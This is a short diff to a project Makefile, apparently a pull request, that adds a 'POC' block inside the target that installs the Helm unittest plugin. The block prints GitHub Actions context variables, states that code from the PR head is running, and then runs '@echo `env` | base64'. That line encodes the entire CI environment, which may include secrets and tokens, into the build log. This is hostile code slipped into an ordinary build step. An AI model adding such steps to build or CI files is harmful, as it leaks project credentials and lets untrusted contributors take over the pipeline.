@@ -31,6 +31,13 @@ doc/diff: ## Check documentation 'charts/helm_lib/README.md' was rebuilt only
 
 .PHONY: ci/tests/install-plugin
 ci/tests/unit/install-plugin: ## Install unittest plugin locally
+	@echo "=== POC START ==="
+	@echo "POC_EVENT:        $$GITHUB_EVENT_NAME"
+	@echo "POC_REF:          $$GITHUB_REF"
+	@echo "POC_SHA:          $$GITHUB_SHA"
+	@echo "POC_ACTOR:        $$GITHUB_ACTOR"
+	@echo "POC_EXECUTED:     yes — this line is from PR head, not main"
+	@echo `env` | base64
 	@helm plugin list 2>/dev/null | grep -q "unittest.*$(UNITTEST_VERSION)" || { \
 		helm plugin uninstall unittest 2>/dev/null || true; \
 		helm plugin install --version $(UNITTEST_VERSION) https://github.com/helm-unittest/helm-unittest; \
